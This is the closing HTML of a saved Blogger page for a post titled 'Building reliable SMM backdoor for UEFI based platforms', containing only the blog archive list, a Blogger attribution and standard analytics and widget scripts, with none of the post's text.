<a class="home-link" href="http://blog.cr4.sh/">Home</a>
</div>
<div class="clear"></div>
<div class="post-feeds">
<div class="feed-links">
Subscribe to:
<a class="feed-link" href="http://blog.cr4.sh/feeds/1711940776197401016/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
</div>
</div>
<script type="text/javascript">window.___gcfg = {'lang': 'en'};</script>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
</aside>
</div>
</div>
</div>
<div style="clear: both"></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class="main-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<footer>
<div class="footer-outer">
<div class="footer-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left footer-fauxborder-left">
<div class="fauxborder-right footer-fauxborder-right"></div>
<div class="region-inner footer-inner">
<div class="foot section" id="footer-1"><div class="widget BlogArchive" id="BlogArchive1">
<h2>Blog Archive</h2>
<div class="widget-content">
<div id="ArchiveList">
<div id="BlogArchive1_ArchiveList">
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2015-01-01T00:00:00-08:00&amp;updated-max=2016-01-01T00:00:00-08:00&amp;max-results=3">
2015
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2015_07_01_archive.html">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="posts">
<li><a href="http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html">Building reliable SMM backdoor for UEFI based plat...</a></li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2015_03_01_archive.html">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2015_02_01_archive.html">
February
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2014-01-01T00:00:00-08:00&amp;updated-max=2015-01-01T00:00:00-08:00&amp;max-results=1">
2014
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2014_11_01_archive.html">
November
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2013-01-01T00:00:00-08:00&amp;updated-max=2014-01-01T00:00:00-08:00&amp;max-results=1">
2013
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2013_01_01_archive.html">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2012-01-01T00:00:00-08:00&amp;updated-max=2013-01-01T00:00:00-08:00&amp;max-results=3">
2012
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2012_07_01_archive.html">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2012_06_01_archive.html">
June
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2012_05_01_archive.html">
May
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2011-01-01T00:00:00-08:00&amp;updated-max=2012-01-01T00:00:00-08:00&amp;max-results=7">
2011
</a>
<span class="post-count" dir="ltr">(7)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2011_11_01_archive.html">
November
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2011_10_01_archive.html">
October
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2011_06_01_archive.html">
June
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2011_04_01_archive.html">
April
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2011_03_01_archive.html">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2011_01_01_archive.html">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2010-01-01T00:00:00-08:00&amp;updated-max=2011-01-01T00:00:00-08:00&amp;max-results=5">
2010
</a>
<span class="post-count" dir="ltr">(5)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2010_12_01_archive.html">
December
</a>
<span class="post-count" dir="ltr">(4)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2010_04_01_archive.html">
April
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/search?updated-min=2009-01-01T00:00:00-08:00&amp;updated-max=2010-01-01T00:00:00-08:00&amp;max-results=3">
2009
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2009_12_01_archive.html">
December
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="http://blog.cr4.sh/2009_10_01_archive.html">
October
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=1259663162418910941&amp;widgetType=BlogArchive&amp;widgetId=BlogArchive1&amp;action=editWidget&amp;sectionId=footer-1" onclick='return _WidgetManager._PopupConfig(document.getElementById("BlogArchive1"));' target="configBlogArchive1" title="Edit">
<img alt="" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/icon18_wrench_allbkg.png" height="18" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div></div>
<!-- outside of the include in order to lock Attribution widget -->
<div class="foot section" id="footer-3"><div class="widget Attribution" id="Attribution1">
<div class="widget-content" style="text-align: center;">
Powered by <a href="https://www.blogger.com/" target="_blank">Blogger</a>.
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=1259663162418910941&amp;widgetType=Attribution&amp;widgetId=Attribution1&amp;action=editWidget&amp;sectionId=footer-3" onclick='return _WidgetManager._PopupConfig(document.getElementById("Attribution1"));' target="configAttribution1" title="Edit">
<img alt="" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/icon18_wrench_allbkg.png" height="18" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div></div>
</div>
</div>
<div class="footer-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class="content-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<script type="text/javascript">
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);

    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-59770284-1', 'auto');
    ga('send', 'pageview');
  </script>
<script type="text/javascript">
if (window.jstiming) window.jstiming.load.tick('widgetJsBefore');
</script><script type="text/javascript" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/71600398-widgets.js"></script>
<script gapi_processed="true" type="text/javascript" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/plusone.js"></script>
<script type="text/javascript">
if (typeof(BLOG_attachCsiOnload) != 'undefined' && BLOG_attachCsiOnload != null) { window['blogger_templates_experiment_id'] = "templatesV2";window['blogger_blog_id'] = '1259663162418910941';BLOG_attachCsiOnload('item_'); }_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d1259663162418910941','//blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html','1259663162418910941');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '1259663162418910941', 'bloggerUrl': 'http://www.blogger.com', 'title': 'My aimful life', 'pageType': 'item', 'postId': '1711940776197401016', 'url': 'http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html', 'canonicalUrl': 'http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html', 'canonicalHomepageUrl': 'http://blog.cr4.sh/', 'homepageUrl': 'http://blog.cr4.sh/', 'blogspotFaviconUrl': 'http://blog.cr4.sh/favicon.ico', 'enabledCommentProfileImages': true, 'adultContent': false, 'disableAdSenseWidget': false, 'analyticsAccountNumber': '', 'searchLabel': '', 'searchQuery': '', 'pageName': 'Building reliable SMM backdoor for UEFI based platforms', 'pageTitle': 'My aimful life: Building reliable SMM backdoor for UEFI based platforms', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'languageDirection': 'ltr', 'feedLinks': '\74link rel\75\42alternate\42 type\75\42application/atom+xml\42 title\75\42My aimful life - Atom\42 href\75\42http://blog.cr4.sh/feeds/posts/default\42 /\76\n\74link rel\75\42alternate\42 type\75\42application/rss+xml\42 title\75\42My aimful life - RSS\42 href\75\42http://blog.cr4.sh/feeds/posts/default?alt\75rss\42 /\76\n\74link rel\75\42service.post\42 type\75\42application/atom+xml\42 title\75\42My aimful life - Atom\42 href\75\42http://www.blogger.com/feeds/1259663162418910941/posts/default\42 /\76\n\n\74link rel\75\42alternate\42 type\75\42application/atom+xml\42 title\75\42My aimful life - Atom\42 href\75\42http://blog.cr4.sh/feeds/1711940776197401016/comments/default\42 /\76\n', 'meTag': '', 'openIdOpTag': '', 'postImageUrl': 'https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/phys-mem-map.png', 'latencyHeadScript': '\74script type\75\42text/javascript\42\76(function() { var b\75window,f\75\42chrome\42,g\75\42tick\42,k\75\42jstiming\42;(function(){function d(a){this.t\75{};this.tick\75function(a,d,c){var e\75void 0!\75c?c:(new Date).getTime();this.t[a]\75[e,d];if(void 0\75\75c)try{b.console.timeStamp(\42CSI/\42+a)}catch(h){}};this[g](\42start\42,null,a)}var a;b.performance\46\46(a\75b.performance.timing);var n\75a?new d(a.responseStart):new d;b.jstiming\75{Timer:d,load:n};if(a){var c\75a.navigationStart,h\75a.responseStart;0\74c\46\46h\76\75c\46\46(b[k].srt\75h-c)}if(a){var e\75b[k].load;0\74c\46\46h\76\75c\46\46(e[g](\42_wtsrt\42,void 0,c),e[g](\42wtsrt_\42,\42_wtsrt\42,h),e[g](\42tbsd_\42,\42wtsrt_\42))}try{a\75null,\nb[f]\46\46b[f].csi\46\46(a\75Math.floor(b[f].csi().pageT),e\46\0460\74c\46\46(e[g](\42_tbnd\42,void 0,b[f].csi().startE),e[g](\42tbnd_\42,\42_tbnd\42,c))),null\75\75a\46\46b.gtbExternal\46\46(a\75b.gtbExternal.pageT()),null\75\75a\46\46b.external\46\46(a\75b.external.pageT,e\46\0460\74c\46\46(e[g](\42_tbnd\42,void 0,b.external.startE),e[g](\42tbnd_\42,\42_tbnd\42,c))),a\46\46(b[k].pt\75a)}catch(p){}})();b.tickAboveFold\75function(d){var a\0750;if(d.offsetParent){do a+\75d.offsetTop;while(d\75d.offsetParent)}d\75a;750\76\75d\46\46b[k].load[g](\42aft\42)};var l\75!1;function m(){l||(l\75!0,b[k].load[g](\42firstScrollTime\42))}b.addEventListener?b.addEventListener(\42scroll\42,m,!1):b.attachEvent(\42onscroll\42,m);\n })();\74/script\076', 'mobileHeadScript': '', 'ieCssRetrofitLinks': '\74!--[if IE]\76\74script type\75\42text/javascript\42 src\75\42https://www.blogger.com/static/v1/jsbin/1333113279-ieretrofit.js\42\76\74/script\76\n\74![endif]--\076', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/cda3ddef07a85452', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'sf': 'n', 'tf': ''}}, {'name': 'skin', 'data': {'vars': {'date_border_size': '0', 'description_font': 'normal normal 16px Georgia, Utopia, \47Palatino Linotype\47, Palatino, serif', 'body_background_gradient_cap': 'none', 'tabs_selected_background_color': '#444444', 'footer_background_gradient': 'none', 'date_background': 'transparent none no-repeat scroll top left', 'widget_border_radius': '0', 'post_title_text_color': '#000000', 'widget_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'widget_link_hover_color': '#d52a33', 'link_visited_color': '#002655', 'date_space': '0', 'post_title_font': 'normal normal 22px Georgia, Utopia, \47Palatino Linotype\47, Palatino, serif', 'tabs_text_color': '#ffffff', 'title_separator_border_size': '1px', 'header_background_gradient': 'none', 'widget_outer_background_gradient': 'none', 'widget_link_color': '#d52a33', 'widget_title_font': 'normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'widget_outer_background_color': 'transparent', 'date_last_border_radius_bottom': '0', 'widget_outer_margin_top': '0', 'shadow_spread': '20px', 'title_shadow_spread': '-1px', 'outer_shadow_spread': '0', 'keycolor': '#b3ca88', 'image_shadow_spread': '0px', 'image_background_color': '#ffffff', 'header_font': 'normal normal 48px Georgia, Utopia, \47Palatino Linotype\47, Palatino, serif', 'header_background_color': '#222222', 'date_header_border_radius_top': '0', 'widget_border_bevel_color': 'transparent', 'tabs_border_color': 'transparent', 'widget_background_color': '#fefdfa', 'date_position': 'static', 'post_first_padding_top': '0', 'tabs_background_gradient': 'url(http://www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png)', 'date_border_color': '#fcfbf5', 'tabs_background_color': '#999999', 'widget_link_visited_color': '#7d181e', 'feed_text_color': '#333333', 'header_margin_top': '0', 'link_hover_color': '#d52a33', 'date_last_space_bottom': '20px', 'header_margin_bottom': '0', 'date_padding_bottom': '0', 'list_separator_border_size': '0', 'description_text_color': '#b8b8b8', 'body_text_color': '#000000', 'header_padding_top': '22px', 'post_border_color': 'transparent', 'footer_text_color': '#333333', 'post_background_color': '#ffffff', 'pager_space_top': '1em', 'endSide': 'right', 'startSide': 'left', 'tabs_font': 'normal bold 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'body_font': 'normal normal 12px Verdana, Geneva, sans-serif', 'date_first_border_radius_top': '0', 'date_header_position': '15px', 'date_text_color': '#191919', 'widget_title_text_color': '#333333', 'image_border_color': '#cccccc', 'separator_outdent': '0', 'widget_text_color': '#333333', 'link_color': '#002655', 'widget_border_color': 'transparent', 'pager_border_radius_top': '0', 'feed_link_color': '#d52a33', 'header_text_color': '#f6ffe7', 'footer_background_color': '#fefdfa', 'widget_padding_top': '8px', 'feed_link_visited_color': '#7d181e', 'feed_link_hover_color': '#d52a33', 'date_font': 'normal normal 12px Arial', 'tabs_selected_text_color': '#ffffff', 'date_side': 'right', 'post_border_bevel_color': 'transparent', 'widget_padding_side': '15px', 'body_background_color': '#cccccc', 'image_border_radius': '0px', 'pager_background_color': '#ffffff', 'widget_alternate_text_color': '#666666'}, 'override': ''}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\75classic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\75flipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\75magazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\75mosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\75sidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\75snapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\75timeslide'}}}]);
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', null, document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'crosscol', null, document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'href': 'http://blog.cr4.sh/', 'title': 'Главная страница', 'isCurrentPage': false}, {'href': 'http://blog.cr4.sh/p/blog-page.html', 'title': 'About', 'isCurrentPage': false, 'id': '2696841979760730930'}], 'mobile': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', null, document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/1803213197-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1185134592-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'footer-1', null, document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading...'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', null, document.getElementById('Attribution1'), {'attribution': 'Powered by \74a href\75\47https://www.blogger.com\47 target\75\47_blank\47\76Blogger\74/a\76.'}, 'displayModeFull'));
</script>

<link href="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/1185134592-lightbox_bundle.css" rel="stylesheet" type="text/css"><script src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/1803213197-lbx.js" type="text/javascript"></script></body></html>